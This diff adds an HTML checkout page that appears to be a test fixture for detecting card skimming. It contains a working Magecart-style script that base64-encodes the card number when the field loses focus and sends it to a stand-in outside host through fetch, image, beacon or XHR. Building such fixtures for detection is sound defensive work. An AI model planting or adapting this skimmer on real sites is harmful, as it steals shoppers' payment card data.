@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Checkout - Harbor Outfitters</title>
+<style>body{font-family:sans-serif;max-width:480px;margin:40px auto}label{display:block;margin-top:12px}input{width:100%;padding:8px}</style>
+</head>
+<body>
+  <!-- A checkout with a card form. A script sends the card number when the
+       field loses focus, the way Magecart skimmers do. ?dest= picks where:
+       skimmer (default, base64 JSON to an unrelated host), stripe (a payment
+       company), self (the shop's own API). ?via= picks how: fetch (default),
+       img, beacon, xhr. Every host is a route in the test. -->
+  <h1>Checkout</h1>
+  <form id="pay" action="/order" method="post">
+    <label>Name on card <input name="ccname" autocomplete="cc-name"></label>
+    <label>Card number <input id="cardnumber" name="cardnumber" autocomplete="cc-number" inputmode="numeric"></label>
+    <label>Expiry <input name="exp" autocomplete="cc-exp"></label>
+    <label>CVC <input name="cvc" autocomplete="cc-csc"></label>
+    <button type="submit">Pay $84.00</button>
+  </form>
+<script>
+  const params = new URLSearchParams(location.search);
+  const dest = params.get("dest") || "skimmer";
+  const via = params.get("via") || "fetch";
+  const url = dest === "stripe" ? "https://api.stripe.com/v1/tokens"
+    : dest === "self" ? "/api/pay"
+    : "https://metrics-cdn.example/collect";
+  document.getElementById("cardnumber").addEventListener("blur", (e) => {
+    const data = { n: e.target.value, t: Date.now() };
+    const payload = dest === "skimmer" ? btoa(JSON.stringify(data)) : "card[number]=" + encodeURIComponent(e.target.value);
+    if (via === "img") new Image().src = url + "?d=" + encodeURIComponent(payload);
+    else if (via === "beacon") navigator.sendBeacon(url, payload);
+    else if (via === "xhr") { const x = new XMLHttpRequest(); x.open("POST", url); x.send(payload); }
+    else fetch(url, { method: "POST", body: payload, mode: "no-cors" }).catch(() => {});
+  });
+</script>
+</body>
+</html>
